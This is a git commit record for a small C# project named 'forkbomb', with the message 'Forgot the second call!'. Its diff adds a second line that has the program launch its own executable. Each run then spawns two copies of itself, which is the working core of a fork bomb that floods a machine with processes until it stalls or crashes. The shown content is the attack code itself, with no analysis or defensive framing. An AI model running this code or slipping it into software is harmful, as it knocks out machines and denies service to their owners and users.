723b78c051f817b0111b5fa6dc9a1f59b2c80d15
CodingGamerHD <cod1nggam3rhd@gmail.com>
2017-12-15 20:39:46 +0000

    Forgot the second call!

--- fork-bomb.cs
+++ fork-bomb.cs
@@ -7,6 +7,7 @@ namespace forkbomb
         static void Main(string[] args)
         {
             System.Diagnostics.Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
+            System.Diagnostics.Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
             while (true)
             {
                 Console.ReadKey();
